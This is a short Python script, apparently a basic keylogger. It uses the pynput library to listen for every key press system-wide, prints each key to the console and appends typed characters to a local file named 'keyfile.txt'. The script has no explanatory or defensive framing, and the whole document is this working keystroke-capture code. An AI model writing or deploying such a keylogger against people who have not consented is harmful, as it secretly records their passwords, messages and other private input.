from pynput import keyboard
def K_pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as LogKey:
        try:
            char = key.char
            LogKey.write(char)
        except AttributeError:
            print('special key {0} pressed'.format(key))


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=K_pressed)
    listener.start()
    input()